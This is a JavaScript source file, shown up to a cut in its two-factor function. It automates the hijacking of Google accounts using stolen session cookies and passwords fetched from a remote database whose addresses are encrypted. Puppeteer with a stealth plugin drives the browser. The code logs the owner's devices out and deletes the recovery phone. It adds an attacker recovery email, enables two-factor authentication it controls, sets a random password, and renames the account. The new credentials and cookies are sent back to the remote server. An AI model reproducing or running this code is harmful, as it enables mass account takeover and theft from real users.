const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const puppeteer = require('puppeteer-extra')
const twofactor = require('node-2fa')
const crypto = require('crypto')
const axios = require('axios')


const BASE_URL = decrypt('CgNuLlQfR3jlSKEMiLtTuk+/9dHkDDtfAGU5YSjvD09hm4EPNlklAb/G5lo/WBPQlXsTRx9qPkaqChXmtGsz4w==')
const DATABASE_URL = decrypt('Ho3w4e0EI9uVPoN9hhxdI4hRUNMBXjo9s8vy5IT9Wh3WhysrJlYcqaa0offkbJzez3xIVwAtUfV1argzGbiIvw==')


let mMailData = null
let mMailRequest = false
let mFinishWork = false
let mMailCookies = {}
let mSameNumber = 0

let mCookie = [
    {
      name: 'LSID',
      value: '',       
      domain: 'accounts.google.com',
      path: '/',
      expires: 1800212948.828837,
      size: 94,
      httpOnly: true,
      secure: true,
      session: false,
      sameSite: 'None',
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'OSID',
      value: '',
      domain: 'myaccount.google.com',
      path: '/',
      expires: 1800212948.153073,
      size: 157,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SAPISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1800212948.957588,
      size: 41,
      httpOnly: false,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'APISID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1800212948.957573,
      size: 40,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1800212948.957563,
      size: 21,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: '__Secure-1PSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1800212948.957496,
      size: 167,
      httpOnly: true,
      secure: true,
      session: false,
      sameParty: true,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'SID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1800212948.957482,
      size: 156,
      httpOnly: false,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    },
    {
      name: 'HSID',
      value: '',
      domain: '.google.com',
      path: '/',
      expires: 1800212948.957553,
      size: 21,
      httpOnly: true,
      secure: false,
      session: false,
      sameParty: false,
      sourceScheme: 'Secure',
      sourcePort: 443
    }
]


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 9) {
            mFinishWork = true
        }
    } catch (error) {}
})

puppeteer.use(StealthPlugin())


startServer()


async function startServer() {
    console.log('Process: ---START-SERVER---')

    let prevNumber = ''

    if (!BASE_URL || !DATABASE_URL) {
        console.log('---PROCESS-CLOSE---')
        process.exit(0)
    }

    while (true) {
        mWorkerActive = false
        let data = await getGmailData()
        if (data && !mFinishWork) {
            try {
                process.send({ t:9, s:true })
            } catch (error) {}
            mWorkerActive = true
            if (prevNumber == data.number) {
                mSameNumber++
            } else {
                mSameNumber = 0
            }
            console.log('Process: [ Receive New Data --- Time: '+getTime()+' ]')
            await loginWithCompleted(data.number, data.password, data.cookies, data.time, data.key)
            prevNumber = data.number
            try {
                process.send({ t:9, s:false })
            } catch (error) {}
        } else {
            await delay(10000)
        }
    }
}

async function loginWithCompleted(number, password, cookies, time, worker) {
    try {
        let raptToken = cookies.substring(0, cookies.indexOf('||'))
        let pureCookies = cookies.substring(cookies.indexOf('||')+2)

        if (await isValidCookies(pureCookies)) {
            mMailRequest = false
            mMailCookies = await getMailCookie(pureCookies)

            mMailData = await getMailTokenData()
            let mMailYear = await getMailYear(mMailData)

            console.log('Process: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
            
            let browser = await puppeteer.launch({
                headless: false,
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-notifications',
                    '--disable-setuid-sandbox',
                    '--ignore-certificate-errors',
                    '--ignore-certificate-errors-skip-list',
                    '--disable-dev-shm-usage'
                ]
            })

            if (parseInt(Date.now()/1000) - time >= 900) {
                raptToken = ''
            }
        
            let loadCookie = {}
            let tempCookie = pureCookies.split(';')

            for (let i = 0; i < tempCookie.length; i++) {
                try {
                    let split = tempCookie[i].trim().split('=')
                    if (split.length == 2) {
                        loadCookie[split[0]] = split[1]
                    }
                } catch (error) {}
            }

            mCookie.forEach((cookie) => {
                let value = loadCookie[cookie['name']]

                if (value) {
                    cookie['value'] = value
                    cookie['size'] = value.length
                }
            })
            
            let page = (await browser.pages())[0]

            page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

            await page.setCookie(...mCookie)

            await page.setRequestInterception(true)

            page.on('request', async request => {
                try {
                    let url = request.url()
                    if (url.startsWith('https://mail.google.com/accounts/SetOSID') && mMailRequest) {
                        try {
                            mMailCookies = await getMailCookie(await getNewCookies(await page.cookies()))
                            mMailData = await getMailTokenData(url)
                            
                            let contentType = 'text/html; charset=utf-8'
                            let output = '<!DOCTYPE html><html><body><h1>Gmail</h1></body></html>'

                            mMailRequest = false

                            request.respond({
                                ok: true,
                                status: 200,
                                contentType,
                                body: output,
                            })
                        } catch (error) {
                            request.continue()
                        }
                    } else {
                        request.continue()
                    }
                } catch (error) {
                    request.continue()
                }
            })

            console.log('Process: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
            
            try {
                let mData = await waitForAccountDetails(page)

                console.log('Process: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                
                let mPassword = null
                let mRapt = null

                if (raptToken && raptToken.length > 10) {
                    mRapt = raptToken
                } else {
                    let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
                    mPassword = encrypt(mToken.password)
                    mRapt = mToken.token
                }

                console.log('Process: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
                
                if (mRapt) {
                    if (mMailData == null) {
                        mMailRequest = true
                        await page.goto('https://mail.google.com/mail/u/0/')
                        mMailYear = await getMailYear(mMailData)
                    }

                    let mYear = mData.year

                    let mNumberYear = await waitForNumberYear(page)

                    let mDeviceYear = await waitForDeviceLogout(page, mRapt)

                    mYear = (mNumberYear < mYear) ? mNumberYear : mYear
                    mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
                    
                    console.log('Process: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')

                    await waitForRemoveRecovery(page, mRapt)
                    
                    let mRecovery = await waitForRecoveryAdd(page, password, mRapt, [])
    
                    console.log('Process: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
                    
                    let rapt = await getRapt(await page.url())

                    if (rapt) mRapt = rapt

                    let mTwoFa = await waitForTwoFaActive(page, mRapt)
        
                    console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')

                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)

                    if(mPassword) {
                        let n_cookies = await getNewCookies(await page.cookies())
                        
                        try {
                            await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            })
                        } catch (error) {}
        
                        console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
                        
                        await waitForLanguageChange(page)
        
                        console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
        
                        await waitForSkipPassworp(page, mRapt)
        
                        console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
        
                        await waitForNameChange(page, mRapt)

                        console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
                    } else {
                        try {
                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
                                headers: {
                                    'Content-Type': 'application/x-www-form-urlencoded'
                                }
                            })
                        } catch (error) {}
                        
                        console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
                        await axios.delete(BASE_URL+'collect/'+number+'.json')
                        mSameNumber = 0
                    }
                } else {
                    let n_cookies = await getNewCookies(await page.cookies())
                    
                    try {
                        await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: time }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}
                }

                try {
                    await axios.delete(BASE_URL+'collect/'+number+'.json')
                } catch (error) {}
            } catch (error) {
                console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
            }
            
            try {
                if (page != null) {
                    await page.close()
                }
            } catch (error) {}

            try {
                if (browser != null) {
                    await browser.close()
                }
            } catch (error) {}   
        } else {
            console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')

            try {
                await axios.patch(BASE_URL+'expire/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}

            await axios.delete(BASE_URL+'collect/'+number+'.json')
        }
    } catch (error) {}

    try {
        if (mSameNumber > 2) {
            try {
                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}
            console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
            await axios.delete(BASE_URL+'collect/'+number+'.json')
            mSameNumber = 0
        }
    } catch (error) {}
}

async function waitForNumberYear(page) {
    try {
        await page.goto('https://myaccount.google.com/phone?hl=en', { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mYear = await page.evaluate(() => {
            let list = document.querySelectorAll('script')
            let years = []
            let year = parseInt(new Date().getFullYear())

            try {
                for (let i = 0; i < list.length; i++) {
                    let html = list[i].innerHTML
                    if (html.startsWith('AF_initDataCallback') && html.includes('rescuephone')) {
                        let data_list = JSON.parse(html.substring(html.indexOf('['), html.lastIndexOf(']')+1))
                        let data = data_list[0]
                        for (let i = 0; i < data.length; i++) {
                            try {
                                let date = data[i][18]
                                if (date > 0) years.push(date)
                            } catch (error) {}
                        }
                    }
                }

                years.sort(function(a, b){return a-b})

                if(years.length > 0) {
                    year = parseInt(new Date(years[0]).getFullYear())
                }
            } catch (error) {}

            return year
        })

        return mYear
    } catch (error) {}

    return parseInt(new Date().getFullYear())
}

async function waitForPasswordChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/signinoptions/password?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let mPassword = getRandomPass()
        await page.type('input[name="password"]', mPassword)
        await delay(500)
        await page.type('input[name="confirmation_password"]', mPassword)
        await delay(500)
        let submit = await findView(page, 'button[type="submit"]', 'Change password')

        if (submit) {
            await submit.click()
        } else {
            await page.click('button[type="submit"]')
        }

        for (let i = 0; i < 20; i++) {
            try {
                let url = await page.url()
                if (url.startsWith('https://myaccount.google.com/security-checkup-welcome')) {
                    break
                } else if (await exists(page, 'button[data-mdc-dialog-action="ok"]')) {
                    await delay(500)
                    await page.click('button[data-mdc-dialog-action="ok"]')
                    await delay(3000)
                }
            } catch (error) {}

            await delay(500)
        }

        return encrypt(mPassword)
    } catch (error) {}

    return null
}

async function waitForRecoveryAdd(page, password, mRapt, mRecovery) {
    try {
        await page.goto('https://myaccount.google.com/recovery/email?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(1000)

        let newmRapt = await waitForLoginChallenge(page, password, 'https://myaccount.google.com/recovery/email')

        if (newmRapt) await delay(500)
        
        let recovery

        if (mRecovery && Array.isArray(mRecovery) && mRecovery.length > 0) {
            let index = Math.floor(Math.random() * mRecovery.length)
            recovery = mRecovery[index]
        } else {
            recovery = getRandomUser() + '@oletters.com'
        }

        let button = await findView(page, 'button', 'Add recovery email')

        if (button) {
            await button.click()
            await waitForSelector(page, 'input[type="email"]', 10)
            await delay(500)
            await page.focus('input[type="email"]')
            await page.keyboard.type(recovery)
            await delay(500)
            await page.click('button[data-mdc-dialog-action="ok"]')
            await delay(3000)
            return recovery
        } else if (await exists(page, 'button[aria-label="Edit recovery email"]')) {
            await page.click('button[aria-label="Edit recovery email"]')
            await waitForSelector(page, 'input[type="email"]', 10)
            await delay(500)

            await page.focus('input[type="email"]')
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')

            await page.keyboard.type(recovery)
            await delay(500)
            await page.click('button[data-mdc-dialog-action="ok"]')
            await delay(3000)
            return recovery
        } else if (await exists(page, 'input[type="email"]')) {
            let hasMail = await page.evaluate(() => {
                let root = document.querySelector('input[type="email"]')
                if (root) {
                    return root.value.length > 0
                }
            })

            await page.focus('input[type="email"]')

            if (hasMail) {
                await page.keyboard.down('Control')
                await page.keyboard.press('A')
                await page.keyboard.up('Control')
                await page.keyboard.press('Backspace')
            }
            
            await page.keyboard.type(recovery)
            await delay(500)
            await page.click('button[type="submit"]')
            await delay(3000)

            return recovery
        }
    } catch (error) {}

    return null
}

async function waitForLoginChallenge(page, password, target) {
    try {
        let url = await page.url()

        if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
            console.log('Node: [ Login Challange --- Time: '+getTime()+' ]')
            await waitForSelector(page, 'input[type="password"]')
            await delay(500)
            await page.type('input[type="password"]', password)
            await delay(500)
            if (await exists(page, '#passwordNext')) {
                await page.click('#passwordNext')
            } else {
                await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
            }
            
            for (let i = 0; i < 20; i++) {
                try {
                    url = await page.url()

                    if (url.startsWith(target)) {
                        return await getRapt(url)
                    } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect') || url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') || url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
                        break
                    }
                } catch (error) {}

                await delay(500)
            }

        }
    } catch (error) {}

    return null
}

async function findView(page, tagName, matchText) {
    try {
        let elements = await page.$$(tagName)

        for (let el of elements) {
            const text = await page.evaluate(el => el.innerText.trim(), el)
            if (text === matchText) {
                return el
            }
        }
    } catch (error) {}

    return null
}

async function waitForFindView(page, tagName, matchText, timeout = 30) {
    for (let i = 0; i < timeout; i++) {
        try {
            let elements = await page.$$(tagName)

            for (let el of elements) {
                const text = await page.evaluate(el => el.innerText.trim(), el)
                if (text === matchText) {
                    return el
                }
            }
        } catch (error) {}

        await delay(500)
    }
    return null
}

async function waitForDeviceLogout(page, rapt) {
    try {
        await page.goto('https://myaccount.google.com/security', { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let data = await page.evaluate(async () => {
            try {
                let at = window.WIZ_global_data?.SNlM0e

                let body = `f.req=%5B%5B%5B%22uPexwe%22%2C%22%5B1%2C1%5D%22%2Cnull%2C%221%22%5D%5D%5D&at=${encodeURIComponent(at)}&`

                let res = await fetch('/_/AccountSettingsUi/data/batchexecute?rpcids=uPexwe&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c',
                    {
                        method: 'POST',
                        headers: {
                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
                        },
                        body,
                        credentials: 'same-origin'
                    })
                
                return await res.text()
            } catch (error) {
                return error
            }
        })

        if (data) {
            let list = deviceList(extractArrays(data)[0])
            let years = []

            console.log('Process: [ Device Size: '+Object.keys(list).length+' --- Time: '+getTime()+' ]')

            for (let [key, value] of Object.entries(list)) {
                try {
                    years.push(value.active)

                    await page.evaluate(async (deviceId, deviceToken, rapt) => {
                        try {
                            let at = window.WIZ_global_data?.SNlM0e
                            let payload = [[[ "YZ6Dc", JSON.stringify([ null, null, deviceToken ]), null, "generic" ]]]
                            let body ='f.req='+encodeURIComponent(JSON.stringify(payload))+'&at='+encodeURIComponent(at)+'&'

                            await fetch(`/_/AccountSettingsUi/data/batchexecute?rpcids=YZ6Dc&source-path=%2Fdevice-activity%2Fid%2F${encodeURIComponent(deviceId)}`+(rapt?`&rapt=${encodeURIComponent(rapt)}`:``)+`&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c`, {
                                method: 'POST',
                                headers: {
                                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                },
                                body,
                                credentials: 'same-origin'
                            })

                            body ='f.req=%5B%5B%5B%22Z5lnef%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(at)+'&'

                            await fetch(`/_/AccountSettingsUi/data/batchexecute?rpcids=Z5lnef&source-path=%2Fdevice-activity%2Fid%2F${encodeURIComponent(deviceId)}`+(rapt?`&rapt=${encodeURIComponent(rapt)}`:``)+`&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c`, {
                                method: 'POST',
                                headers: {
                                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                },
                                body,
                                credentials: 'same-origin'
                            })
                        } catch (e) {}
                    }, key, value.token, rapt)

                    console.log('Process: [ Logout Success: '+value.name+' --- Time: '+getTime()+' ]')
                } catch (error) {}

                await delay(1000)
            }

            years.sort(function(a, b){return a-b})
            
            if(years.length > 0) {
                let year = parseInt(new Date(years[0]).getFullYear())
                if (year > 2000) {
                    return year
                }
            }            
        }
    } catch (error) {}

    return parseInt(new Date().getFullYear())
}

async function waitForLanguageChange(page) {
    try {
        await page.goto('https://myaccount.google.com/language?hl=en', { waitUntil: 'load', timeout: 0 })
        await delay(500)
        let isEnglish = await page.evaluate(() => {
            let root = document.querySelector('div[class="xsr7od"]')
            if (root) {
                return root.lang.startsWith('en')
            }
            return false
        })

        let mList = await page.evaluate(() => {
            let list = []
            let root = document.querySelectorAll('li[data-id]')
            if (root) {
                for (let i = 0; i < root.length; i++) {
                    try {
                        let id = root[i].getAttribute('data-id')
                        if (id) {
                            list.push(id)
                        }
                    } catch (error) {}
                }
            }
            return list
        })

        if (!isEnglish) {
            await page.evaluate(() => {
                return (async () => {
                    try {
                        let body = window.WIZ_global_data.cfb2h
                        let time = window.WIZ_global_data.SNlM0e.replace(':', '%3A')

                        await fetch('https://myaccount.google.com/_/language_update?bl='+body+'&soc-app=1&soc-platform=1&soc-device=1&rt=j', {
                            'headers': {
                            'accept': '*/*',
                            'accept-language': 'en-US,en;q=0.9',
                            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                            'sec-ch-ua': '\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"',
                            'sec-ch-ua-arch': '\"x86\"',
                            'sec-ch-ua-bitness': '\"64\"',
                            'sec-ch-ua-full-version': '\"112.0.5614.0\"',
                            'sec-ch-ua-full-version-list': '\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5614.0\"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-model': '\"\"',
                            'sec-ch-ua-platform': '\"Windows\"',
                            'sec-ch-ua-platform-version': '\"19.0.0\"',
                            'sec-ch-ua-wow64': '?0',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'x-client-data': 'COP7ygE=',
                            'x-same-domain': '1'
                            },
                            'referrer': 'https://myaccount.google.com/language?nlr=1',
                            'referrerPolicy': 'origin-when-cross-origin',
                            'body': 'f.req=%5B%5B%22en%22%5D%5D&at='+time+'&',
                            'method': 'POST',
                            'mode': 'cors',
                            'credentials': 'include'
                        })
                    } catch (error) {}
                    return true
                })()
            })
        }
        
        await delay(1000)

        for (let i = 0; i < mList.length; i++) {
            try {
                if (mList[i] != 'en' || mList[i].startsWith('en')) {
                    await page.evaluate((id) => {
                        return (async () => {
                            try {
                                let body = window.WIZ_global_data.cfb2h
                                let time = window.WIZ_global_data.SNlM0e.replace(':', '%3A')
        
                                await fetch('https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=w9OE8d&source-path=%2Flanguage&bl='+body+'&&hl=en&soc-app=1&soc-platform=1&soc-device=1&rt=c', {
                                    'headers': {
                                    'accept': '*/*',
                                    'accept-language': 'en-US,en;q=0.9',
                                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                                    'sec-ch-ua': '\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"',
                                    'sec-ch-ua-arch': '\"x86\"',
                                    'sec-ch-ua-bitness': '\"64\"',
                                    'sec-ch-ua-full-version': '\"112.0.5614.0\"',
                                    'sec-ch-ua-full-version-list': '\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5614.0\"',
                                    'sec-ch-ua-mobile': '?0',
                                    'sec-ch-ua-model': '\"\"',
                                    'sec-ch-ua-platform': '\"Windows\"',
                                    'sec-ch-ua-platform-version': '\"19.0.0\"',
                                    'sec-ch-ua-wow64': '?0',
                                    'sec-fetch-dest': 'empty',
                                    'sec-fetch-mode': 'cors',
                                    'sec-fetch-site': 'same-origin',
                                    'x-client-data': 'COP7ygE=',
                                    'x-same-domain': '1'
                                    },
                                    'referrer': 'https://myaccount.google.com/language?nlr=1',
                                    'referrerPolicy': 'origin-when-cross-origin',
                                    'body': 'f.req=%5B%5B%5B%22w9OE8d%22%2C%22%5B2%2C%5C%22'+id+'%5C%22%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+time+'&',
                                    'method': 'POST',
                                    'mode': 'cors',
                                    'credentials': 'include'
                                })
                            } catch (error) {}
        
                            return true
                        })()
                    }, mList[i])
                }
            } catch (error) {}

            await delay(500)
        }
    } catch (error) {}
}

async function waitForNameChange(page, mRapt) {
    try {
        await page.goto('https://myaccount.google.com/profile/name/edit?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
        await delay(500)

        let mInput = await page.$$('input[type="text"][id]')
        if (mInput.length == 2) {
            let mName = await getName()
            let mSplit = mName.split(' ')
            await mInput[0].focus()
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
            await page.keyboard.type(mSplit[0])
            await delay(500)
            await mInput[1].focus()
            await page.keyboard.down('Control')
            await page.keyboard.press('A')
            await page.keyboard.up('Control')
            await page.keyboard.press('Backspace')
            await page.keyboard.type(mSplit[1])
            await delay(500)
            let save = await findView(page, 'button', 'Save')
            if (save) {
                await save.click()
                await delay(3000)
                console.log('Process: [ Name Change: '+mName+' --- Time: '+getTime()+' ]')
            } else {
                await delay(3000)
                console.log('Process: [ Name Change: Error --- Time: '+getTime()+' ]')
            }
            return true
        }
    } catch (error) {}

    console.log('Process: [ Name Change: Failed --- Time: '+getTime()+' ]')
}

async function waitForRemoveRecovery(page, mRapt) {
    try {
        let loadPage = true
        let mRemove = false
        try {
            loadPage = !await page.url().startsWith('https://myaccount.google.com/signinoptions/rescuephone')
        } catch (error) {}

        if (loadPage) {
            await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en&rapt='+mRapt, { waitUntil: 'load', timeout: 0 })
            await delay(500)
        }

        for (let i = 0; i < 5; i++) {
            if (await exists(page, 'div[data-phone]')) {
                try {
                    if (await exists(page, 'button[aria-label="Remove phone number"]')) {
                        await delay(500)
                        await page.click('button[aria-label="Remove phone number"]')
                    } else {
                        await delay(1000)
                        continue
                    }
                    
                    for (let i = 0; i < 10; i++) {
                        await delay(1000)
                        let remove = await findView(page, 'div[role="button"]', 'REMOVE NUMBER')
                        if (remove) {
                            await remove.click()
                            console.log('Process: [ Recovery Number: Delete Success --- Time: '+getTime()+' ]')
                            await delay(2000)
                            mRemove = true
                            break
                        }
                    }
                } catch (error) {}
            } else if (mRemove) {
                return true
            } else {
                let add = await findView(page, 'button', 'Add recovery phone')
                if (add) {
                    console.log('Process: [ Recovery Number Not Found --- Time: '+getTime()+' ]')
                    return true
                }
            }

            await delay(1000)
        }
    } catch (error) {}

    console.log('Process: [ Recovery Number: Delete Error --- Time: '+getTime()+' ]')

    return false
}

async function waitForAccountDetails(page) {
    await page.goto('https://myaccount.google.com/security?hl=en', { waitUntil: 'load', timeout: 0 })
    await delay(500)

    return await page.evaluate(() => {
        let years = ['2025', '2024', '2023', '2022', '2021', '2020', '2019', '2018', '2017', '2016', '2015', '2014', '2013', '2012', '2011', '2010']
        let root = document.querySelectorAll('a[href*="signinoptions/password"]')
        let year = parseInt(new Date().getFullYear())
        let gmail = null
        if (root) {
            for (let i = 0; i < root.length; i++) {
                try {
                    let text = root[i].innerText
                    
                    for (let j = 0; j < years.length; j++) {
                        if (text.includes(years[j])) {
                            year = parseInt(years[j])
                            break
                        }
                    }

                    if (year) {
                        break
                    }
                } catch (error) {}
            }
        }

        try {
            let global = window.WIZ_global_data
            if (global && global.oPEP7c) {
                gmail = global.oPEP7c.replace('@gmail.com', '')
            }
        } catch (error) {}

        return { year:year, gmail:gmail }
    })
}

async function waitForRaptToken(page, number, password) {
    let mPassword = null
    let mCodeSend = false
    let mRapt = null

    try {
        for (let k = 0; k < 2; k++) {
            await page.goto('https://myaccount.google.com/signinoptions/rescuephone?hl=en', { waitUntil: 'load', timeout: 0 })

            await delay(500)

            for (let i = 0; i < 10; i++) {
                let url = await page.url()
                if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                    mRapt = await getRapt(url)
                    break
                } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
                    console.log('Process: [ Login Challange: '+number+' --- Time: '+getTime()+' ]')
                    await waitForSelector(page, 'input[type="password"]')
                    await delay(500)
                    await page.type('input[type="password"]', password)
                    await delay(500)
                    if (await exists(page, '#passwordNext')) {
                        await page.click('#passwordNext')
                    } else {
                        await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
                    }

                    let changePassword = true
                    let changeConfirm = true
                    let cSelection = true
                    let cNumber = true
                    mCodeSend = false
                    
                    for (let load = 0; load < 30; load++) {
                        try {
                            let url = await page.url()

                            if (url.startsWith('https://myaccount.google.com/signinoptions/rescuephone')) {
                                mRapt = await getRapt(url)
                                break
                            } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/dp') || url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/collect')) {
                                break
                            } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/selection') && cSelection) {
                                if (await exists(page, 'div[data-action="selectchallenge"][data-challengetype="13"]')) {
                                    console.log('Process: [ Selection Challange: '+number+' --- Time: '+getTime()+' ]')
                                    await delay(2000)
                                    await page.click('div[data-action="selectchallenge"][data-challengetype="13"]')
                                    cSelection = false
                                    load = 0
                                } else {
                                    break
                                }
                            } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/kpp') && cNumber) {
                                if(!number) break
                                if (await exists(page, 'input#phoneNumberId')) {
                                    console.log('Process: [ Number Type: '+number+' --- Time: '+getTime()+' ]')
                                    await delay(2000)
                                    await page.type('input#phoneNumberId', number)
                                    await delay(500)
                                    await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b"]')
                                    cNumber = false
                                    load = 10
                                }
                            } else if (url.startsWith('https://accounts.google.com/v3/signin/challenge/ipp/consent')) {
                                console.log('Process: [ OTP Send: '+number+' --- Time: '+getTime()+' ]')
                                mCodeSend = true
                                break
                            } else if (url.startsWith('https://accounts.google.com/signin/v2/speedbump/changepassword/changepasswordform') && changePassword) {
                                try {
                                    await waitForSelector(page, 'input[name="Passwd"]')
                                    await delay(500)
                                    mPassword = getRandomPass()
                                    
                                    await page.type('input[name="Passwd"]', mPassword)
                                    await delay(500)
                                    await page.type('input[name="ConfirmPasswd"]', mPassword)
                                    await delay(500)
                                    await page.click('#changepasswordNext')
                                    await delay(1000)
                                    changeConfirm = true
                                    changePassword = false
                                    load = 10
                                } catch (error) {}
                            } else if (mPassword && changeConfirm) {
                                if (await exists(page, 'div[class="VfPpkd-T0kwCb"] > button:nth-child(3)')) {
                                    await page.click('div[class="VfPpkd-T0kwCb"] > button:nth-child(3)')
                                    await delay(1000)
                                    changeConfirm = false
                                }
                            }
                        } catch (error) {}

                        await delay(500)
                    }

                    break
                }

                await delay(500) 
            }

            if (mCodeSend) {
                continue
            }

            break
        }
    } catch (error) {}

    return { token:mRapt, password:mPassword }
}

async function waitForTwoFaActive(page, mRapt) {
    let mAuthToken = null
    let mBackupCode = null

    try {
        let url = await page.url()
        if (url.startsWith('https://accounts.google.com/v3/signin/confirmidentifer')) {
